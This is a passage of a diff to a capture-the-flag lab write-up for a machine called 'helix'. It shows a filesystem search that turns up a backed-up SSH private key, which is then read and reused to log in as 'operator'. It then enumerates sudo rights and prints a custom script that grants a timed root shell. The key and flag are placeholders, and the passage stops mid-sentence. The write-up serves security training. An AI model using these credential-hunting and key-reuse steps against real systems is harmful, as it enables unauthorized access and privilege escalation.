@@ -101,4 +101,149 @@ plc:x:997:997::/opt/ot:/usr/sbin/nologin
 _laurel:x:996:996::/var/log/laurel:/bin/false
 ```
 
-Theres a user named `operator` 
+Theres a user named `operator` within the machine that may have clues or existing files on the machine that could help us narrow down getting to the user flag or privilege escalation.
+
+```
+nifi@helix:/opt/nifi-1.21.0$ find / -iname "*operator*" 2>/dev/null
+/home/operator
+/usr/lib/python3.11/lib2to3/fixes/fix_operator.py
+/usr/lib/python3/dist-packages/twisted/test/test_cooperator.py
+/usr/lib/python3/dist-packages/twisted/test/__pycache__/test_cooperator.cpython-310.pyc
+/usr/lib/python3.10/lib2to3/fixes/fix_operator.py
+/usr/lib/python3.10/lib2to3/fixes/__pycache__/fix_operator.cpython-310.pyc
+/usr/lib/python3.10/__pycache__/operator.cpython-310.pyc
+/usr/lib/python3.10/operator.py
+/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
+nifi@helix:/opt/nifi-1.21.0$ 
+```
+
+Nothing of note besides one file. `/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak`. The key part of this is the `id_ed25519`. This most definitely represents an ssh key. If we are able to read the key we can copy it and use it to bypass password authentication for the user `operator`.
+
+```
+nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak 
+-----BEGIN OPENSSH PRIVATE KEY-----
+<PRIVATE_KEY_HERE>
+-----END OPENSSH PRIVATE KEY-----
+nifi@helix:/opt/nifi-1.21.0/support-bundles$ 
+```
+
+Fantastic. We can copy the key directly over to our attacker machine, `chmod 600` it and intiate an SSH connection via the user `operator`.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
+└─# chmod 600 operator_key                        
+                                                                          
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
+└─# ssh -i ./operator_key operator@10.129.2.106   
+The authenticity of host '10.129.2.106 (10.129.2.106)' can't be established.
+ED25519 key fingerprint is: SHA256:nGwNnXA5oCIEMCxZ3joJWy3usUFUt70Wqy72RayvMNA
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.2.106' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri May 22 09:13:07 AM UTC 2026
+
+  System load:           0.0
+  Usage of /:            87.1% of 6.52GB
+  Memory usage:          42%
+  Swap usage:            0%
+  Processes:             231
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.2.106
+  IPv6 address for eth0: dead:beef::a0de:adff:fe0d:fd34
+
+  => / is using 87.1% of 6.52GB
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri May 22 09:13:09 2026 from 10.10.16.65
+operator@helix:~$
+```
+
+We can find the `user.txt` flag in the home directory.
+
+```
+operator@helix:~$ cat user.txt
+<USER_FLAG_HERE>
+```
+
+We can now do the same thing again. Attempt to find an alternative way to escalate privileges to root via the `operator` user. 
+
+```
+operator@helix:~$ sudo -l
+Matching Defaults entries for operator on helix:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User operator may run the following commands on helix:
+    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
+```
+
+Checking `sudo` permissions we can see that the user `operator` has sudo permissions via the `/usr/local/sbin/helix-maint-console`. We can go there and enumerate further to see what exactly it does.
+
+```
+operator@helix:~$ cd /usr/local/sbin/
+operator@helix:/usr/local/sbin$ ls
+helix-cleanup.sh  helix-maint-console  laurel  unminimize
+operator@helix:/usr/local/sbin$ cat helix-maint-console
+#!/bin/bash
+set -euo pipefail
+
+FLAG="/opt/helix/state/maintenance_window"
+
+read_until() { cat "$FLAG" 2>/dev/null || true; }
+
+window_ok() {
+  [ -f "$FLAG" ] || return 1
+  local until_ts now
+  until_ts="$(read_until)"
+  now="$(date +%s)"
+  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
+  [ "$now" -lt "$until_ts" ] || return 1
+  return 0
+}
+
+if ! window_ok; then
+  echo "Maintenance window CLOSED."
+  exit 1
+fi
+
+until_ts="$(read_until)"
+now="$(date +%s)"
+remaining=$((until_ts-now))
+
+echo "[+] Privileged maintenance access granted"
+echo "[!] Window expires in ${remaining} seconds"
+echo "[!] Session will be terminated automatically"
+
+# Unique scope name
+SCOPE="helix-maint-$$"
+
+# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
+systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
+  /bin/bash -p -i
+
+# If systemd-run returns, the shell exited.
+exit 0
+operator@helix:
+```
+
+This is interesting. This is a custom file so known CVE's would be available. The file is referencing a `maintenance_window` file in a different directory that if activated and the `maint-helix-console` is called at the same time, can grant the executing user root access to the machine for a period of time.
+
+We can try to go further to view the file's contents to see what exactly 
